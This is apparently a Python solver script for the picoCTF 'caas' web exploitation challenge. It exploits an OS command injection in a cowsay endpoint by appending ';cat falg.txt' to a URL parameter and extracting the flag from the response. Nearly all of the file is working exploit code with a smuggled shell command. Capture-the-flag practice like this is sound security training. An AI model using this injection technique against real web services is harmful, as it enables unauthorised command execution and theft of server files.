#!/usr/bin/env python3
"""Solver for Challenge 202 caas (picoMini by redpwn, Web Exploitation).

Target: GET /cowsay/:message on https://caas.mars.cylabacademy.net
Root cause: index.js interpolates req.params.message into shell:
  exec(`/usr/games/cowsay ${req.params.message}`) -> OS command injection (CWE-78).
Exploit: append ';cat falg.txt' (note typo filename 'falg.txt') via URL-encoded ';' (%3B).
Flag has picoCTF{} wrapper (event-native format, verified live).

Usage: solve_202_caas.py [base_url]
"""
import re
import sys
import urllib.request

BASE = "https://caas.mars.cylabacademy.net"
FLAG_RE = re.compile(r"(academy\{[^}]*\}|picoCTF\{[^}]*\}|flag\{[^}]*\})")


def get(base, path, timeout=20):
    req = urllib.request.Request(base + path, headers={"User-Agent": "Mozilla/5.0"})
    return urllib.request.urlopen(req, timeout=timeout).read().decode(errors="replace")


def main():
    base = (sys.argv[1] if len(sys.argv) > 1 else BASE).rstrip("/")
    # sanity: benign cowsay works
    body = get(base, "/cowsay/hi")
    assert "hi" in body, "cowsay endpoint unreachable"
    # injection probe
    body = get(base, "/cowsay/x%3Bcat%20falg.txt")
    m = FLAG_RE.search(body)
    if not m:
        print("FLAG NOT FOUND. Response tail:")
        print(body[-1500:])
        sys.exit(1)
    print(m.group(1))


if __name__ == "__main__":
    main()
